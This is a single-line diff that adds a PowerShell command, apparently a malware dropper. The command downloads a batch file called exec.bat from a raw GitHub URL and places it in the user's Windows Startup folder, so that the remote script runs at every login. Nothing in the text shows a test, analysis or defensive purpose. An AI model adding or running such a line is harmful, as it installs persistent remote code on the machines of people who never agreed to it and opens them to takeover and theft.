@@ -1,0 +1,1 @@
+powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/timberh789/Server/main/exec.bat', '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\exec.bat')
